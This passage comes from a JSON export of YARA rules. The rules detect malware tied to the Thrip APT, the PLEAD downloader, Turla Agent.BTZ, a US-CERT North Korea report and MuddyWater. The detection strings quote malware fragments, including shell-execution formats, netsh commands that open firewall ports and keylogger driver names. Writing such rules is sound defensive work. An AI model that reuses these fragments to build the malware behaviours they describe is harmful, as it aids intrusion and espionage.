12:05:31","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_1_RID2FA2","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"bd85d955f29d90efa1892523481d92f9","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_2_RID2FA3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\WINDOWS\\\\system32\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n      $s2 = \"ProbeScriptFint\" fullword wide\n      $s3 = \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2018-06-21 12:05:41","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_2_RID2FA3","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"072da4a7c4a18fed64e26f24b80e4ab8","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_3_RID2FA4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:05:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\SysNative\\\\cmd.exe\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\SysNative\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them\n}","date":"2018-06-21 12:05:51","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_3_RID2FA4","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"681acf80e792f90a6a57a6760ab13cb0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_4_RID2FA5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\system32\\\\wbem\\\\tmf\\\\caches_version.db\" fullword ascii\n      $s2 = \"ProcessName No Access\" fullword ascii\n      $s3 = \"Hwnd of Process NULL\" fullword ascii\n      $s4 = \"*********The new session is be opening:(%d)**********\" fullword ascii\n      $s5 = \"[EXECUTE]\" fullword ascii\n      $s6 = \"/------------------------------------------------------------------------\" fullword ascii\n      $s7 = \"constructor or from DllMain.\" fullword ascii\n      $s8 = \"Time:%d-%d-%d %d:%d:%d\" fullword ascii\n      $s9 = \"\\\\info.config\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them\n}","date":"2018-06-21 12:06:01","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_4_RID2FA5","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"d6f4818c1ca83ffcf25ad91bffb1a41f","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_5_RID2FA6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"c:\\\\windows\\\\USBEvent.exe\" fullword ascii\n      $s5 = \"c:\\\\windows\\\\spdir.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2018-06-21 12:06:11","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_5_RID2FA6","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"59d58dd876e31e1f0a48f76b81af0ebc","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_6_RID2FA7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\Windows\\\\system32\\\\Instell.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them\n}","date":"2018-06-21 12:06:21","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_6_RID2FA7","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"885b0ef5472feabc36e6adab633f2c12","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_7_RID2FA8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\runme.exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them\n}","date":"2018-06-21 12:06:31","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_7_RID2FA8","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"aa6534d29321a7604e7002e67f0c399b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_8_RID2FA9 : APT DEMO {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$.oS.Run('cmd.exe /c '+a+'\" fullword ascii\n      $x2 = \"new $._x('WScript.Shell');\" ascii\n      $x3 = \".ExpandEnvironmentStrings('%Temp%')+unescape('\" ascii\n   condition: \n      filesize < 10KB and 1 of ( $x* )\n}","date":"2018-06-21 12:06:41","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_8_RID2FA9","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"5e0c7a650501521d8f076b6a19948892","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_9_RID2FAA : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:06:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"a7f0714e82b3105031fa7bc89dfe7664\" or pe.imphash ( ) == \"8812ff21aeb160e8800257140acae54b\" or pe.imphash ( ) == \"44a1e904763fe2d0837c747c7061b010\" or pe.imphash ( ) == \"51a854d285aa12eb82e76e6e1be01573\" or pe.imphash ( ) == \"a1f457c8c549c5c430556bfe5887a4e6\" )\n}","date":"2018-06-21 12:06:51","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_9_RID2FAA","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"76cb7ecfbd2b761cfaabae73666adcc0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_11_RID2FD3 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:13:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\AppData\\\\Local\\\\Temp\\\\dw20.EXE\" ascii\n      $s2 = \"C:\\\\Windows\\\\system32\\\\sysprep\\\\cryptbase.dll\" fullword ascii\n      $s3 = \"WFQNJMBWF\" fullword ascii\n      $s4 = \"SQLWLWZSF\" fullword ascii\n      $s5 = \"PFQUFQSBPP\" fullword ascii\n      $s6 = \"WQZXQFPVOW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == \"6eef4394490378f32d134ab3bf4bf194\" or all of them )\n}","date":"2018-06-21 12:13:41","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_11_RID2FD3","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"68fbc87a090b4657e9320f4c1fdeee0c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_12_RID2FD4 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:13:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"pGlobal->nOSType==64--%s\\\\cmd.exe %s\" fullword ascii\n      $s2 = \"httpcom.log\" fullword ascii\n      $s3 = \"\\\\CryptBase.dll\" fullword ascii\n      $s4 = \"gupdate.exe\" fullword ascii\n      $s5 = \"wusa.exe\" fullword ascii\n      $s6 = \"/c %s %s /quiet /extract:%s\\\\%s\\\\\" fullword ascii\n      $s7 = \"%s%s.dll.cab\" fullword ascii\n      $s8 = \"/c %s\\\\%s\\\\%s%s %s\" fullword ascii\n      $s9 = \"ReleaseEvildll\" fullword ascii\n      $s0 = \"%s\\\\%s\\\\%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 6 of them\n}","date":"2018-06-21 12:13:51","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_12_RID2FD4","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"310659f9e5facfca8b57015698c845f2","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_13_RID2FD5 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" fullword ascii\n      $s2 = \"<member><name>password</name>\" fullword ascii\n      $s3 = \"<value><string>qqtorspy</string></value>\" fullword ascii\n      $s4 = \"SOFTWARE\\\\QKitTORSPY\" fullword wide\n      $s5 = \"ipecho.net\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"3dfad33b2fb66c083c99dc10341908b7\" or 4 of them )\n}","date":"2018-06-21 12:14:01","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_13_RID2FD5","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"97686ef26597255211b1f013a1769fa7","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_14_RID2FD6 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k \" fullword ascii\n      $s2 = \"spdirs.dll\" fullword ascii\n      $s3 = \"Provides storm installation services such as Publish, and Remove.\" fullword ascii\n      $s4 = \"RegSetValueEx(Svchost\\\\netsvcs)\" fullword ascii\n      $s5 = \"Load %s Error\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( \"InstallA\" ) and pe.exports ( \"InstallB\" ) and pe.exports ( \"InstallC\" ) ) or all of them )\n}","date":"2018-06-21 12:14:11","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_14_RID2FD6","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"b3229a509922511aa17d441bcf60bd9c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_10_RID2FD2 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"!This Program cannot be run in DOS mode.\" fullword ascii\n      $x2 = \"!this program cannot be run in dos mode.\" fullword ascii\n      $s1 = \"svchost.dll\" fullword ascii\n      $s2 = \"constructor or from DllMain.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( $x1 or 2 of them )\n}","date":"2018-06-21 12:13:31","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_10_RID2FD2","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"5505225b0656a48ae0080f2505d5b125","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_15_RID2FD7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\cmd.exe /c %s\" fullword ascii\n      $s2 = \"CryptBase.dll\" fullword ascii\n      $s3 = \"gupdate.exe\" fullword ascii\n      $s4 = \"wusa.exe\" fullword ascii\n      $s5 = \"/c %s %s /quiet /extract:%s\\\\%s\\\\\" fullword ascii\n      $s6 = \"%s%s.dll.cab\" fullword ascii\n      $s7 = \"%s\\\\%s\\\\%s%s %s\" fullword ascii\n      $s8 = \"%s\\\\%s\\\\%s%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == \"f6ec70a295000ab0a753aa708e9439b4\" or 6 of them )\n}","date":"2018-06-21 12:14:21","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_15_RID2FD7","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"4eafdd297e00ce45c3bda4f9fecc4ec5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_16_RID2FD8 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[%d] Failed, %08X\" fullword ascii\n      $s2 = \"woqunimalegebi\" fullword ascii\n      $s3 = \"[%d] Offset can not fetched.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of them or pe.imphash ( ) == \"c6a4c95d868a3327a62c9c45f5e15bbf\" )\n}","date":"2018-06-21 12:14:31","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_16_RID2FD8","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":["pe"],"rule_hash":"6624479e657a33b7d8b4b9f5551e66df","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_17_RID2FD9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"c:\\\\users\\\\administrator\\\\desktop\\\\code\\\\skeyman2\\\\\" ascii\n      $x2 = \"\\\\SkeyMan2.pdb\" ascii\n      $x3 = \"\\\\\\\\.\\\\Pnpkb\" fullword ascii\n      $s1 = \"\\\\DosDevices\\\\Pnpkb\" fullword wide\n      $s2 = \"\\\\DosDevices\\\\PnpKb\" fullword wide\n      $s3 = \"\\\\Driver\\\\kbdhid\" fullword wide\n      $s4 = \"\\\\Device\\\\PnpKb\" fullword wide\n      $s5 = \"Microsoft  Windows Operating System\" fullword wide\n      $s6 = \"hDevice == INVALID_HANDLE_VALUE\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) and 1 of ( $s* ) )\n}","date":"2018-06-21 12:14:41","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_17_RID2FD9","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"48e6e9e05e9fd58b3e0244976ee9b947","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_Thrip_Sample_Jun18_18_RID2FDA : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects sample found in Thrip report by Symantec \"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets \"\n      date = \"2018-06-21 12:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key\" fullword ascii\n      $s2 = \"Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard\" fullword ascii\n      $s3 = \"LoadLibraryA() failed in KbdGetProcAddressByName()\" fullword ascii\n      $s5 = \"Unknown Virtual-Key Code\" fullword ascii\n      $s6 = \"Computer Sleep key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2018-06-21 12:14:51","description":"Detects sample found in Thrip report by Symantec ","minimum_yara":"1.7","name":"APT_Thrip_Sample_Jun18_18_RID2FDA","reference":"https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets ","required_modules":[],"rule_hash":"f82008ea0e930ee78eebf40fe7b06a4b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PLEAD_Downloader_Jun18_1_RID2F6A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PLEAD Downloader\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html\"\n      date = \"2018-06-16 11:56:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%02d:%02d:%02d\" ascii fullword\n      $s2 = \"%02d-%02d-%02d\" ascii fullword\n      $s3 = \"1111%02d%02d%02d_%02d%02d2222\" ascii fullword\n      $a1 = \"Scanning...\" wide fullword\n      $a2 = \"Checking...\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or ( 2 of ( $s* ) and 1 of ( $a* ) ) )\n}","date":"2018-06-16 11:56:11","description":"Detects PLEAD Downloader","minimum_yara":"1.7","name":"PLEAD_Downloader_Jun18_1_RID2F6A","reference":"https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html","required_modules":[],"rule_hash":"c66f744e3361c17f8d1e12089bd50d22","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule APT_Turla_Agent_BTZ_Gen_1_RID3003 : APT DEMO EXE FILE GEN RUSSIA {\n   meta:\n      description = \"Detects Turla Agent.BTZ\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-06-16 12:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, GEN, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\" fullword ascii\n      $s1 = \"release mutex - %u (%u)(%u)\" fullword ascii\n      $s2 = \"\\\\system32\\\\win.com\" fullword ascii\n      $s3 = \"Command Id:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)\" fullword ascii\n      $s4 = \"MakeFile Error(%d) copy file to temp file %s\" fullword ascii\n      $s5 = \"%s%%s08x.tmp\" fullword ascii\n      $s6 = \"Run instruction: %d ID:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)\" fullword ascii\n      $s7 = \"Mutex_Log\" fullword ascii\n      $s8 = \"%s\\\\system32\\\\winview.ocx\" fullword ascii\n      $s9 = \"Microsoft(R) Windows (R) Operating System\" fullword wide\n      $s10 = \"Error: pos(%d) > CmdSize(%d)\" fullword ascii\n      $s11 = \"\\\\win.com\" fullword ascii\n      $s12 = \"Error(%d) run %s \" fullword ascii\n      $s13 = \"%02d.%02d.%04d Log begin:\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"9d0d6daa47d6e6f2d80eb05405944f87\" or ( pe.exports ( \"Entry\" ) and pe.exports ( \"InstallM\" ) and pe.exports ( \"InstallS\" ) ) or $x1 or 3 of them ) or ( 5 of them )\n}","date":"2018-06-16 12:21:41","description":"Detects Turla Agent.BTZ","minimum_yara":"1.7","name":"APT_Turla_Agent_BTZ_Gen_1_RID3003","reference":"Internal Research","required_modules":["pe"],"rule_hash":"954fbf13ceb44f194cdfa8f6b475133f","score":80,"tags":["DEMO","FILE","APT","RUSSIA","GEN","EXE"]},{"author":"Florian Roth","content":"rule APT_NK_AR18_165A_1_RID2C15 : APT DEMO EXE FILE T1089 {\n   meta:\n      description = \"Detects APT malware from AR18-165A report by US CERT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.us-cert.gov/ncas/analysis-reports/AR18-165A\"\n      date = \"2018-06-15 09:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1089\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"netsh.exe advfirewall firewall add rule name=\\\"PortOpenning\\\" dir=in protocol=tcp localport=%d action=allow enable=yes\" fullword wide\n      $s2 = \"netsh.exe firewall add portopening TCP %d \\\"PortOpenning\\\" enable\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2018-06-15 09:34:01","description":"Detects APT malware from AR18-165A report by US CERT","minimum_yara":"1.7","name":"APT_NK_AR18_165A_1_RID2C15","reference":"https://www.us-cert.gov/ncas/analysis-reports/AR18-165A","required_modules":[],"rule_hash":"32b90b0c9c4fc974b03b0ec757a23457","score":75,"tags":["APT","DEMO","EXE","FILE","T1089"]},{"author":"Florian Roth","content":"rule MAL_MuddyWater_DroppedTask_Jun18_1_RID3395 : APT DEMO FILE {\n   meta:\n      description = \"Detects a dropped Windows task as used by MudyWater in June 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://app.any.run/tasks/719c94eb-0a00-47cc-b583-ad4f9e25ebdb\"\n      date = \"2018-06-12 14:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      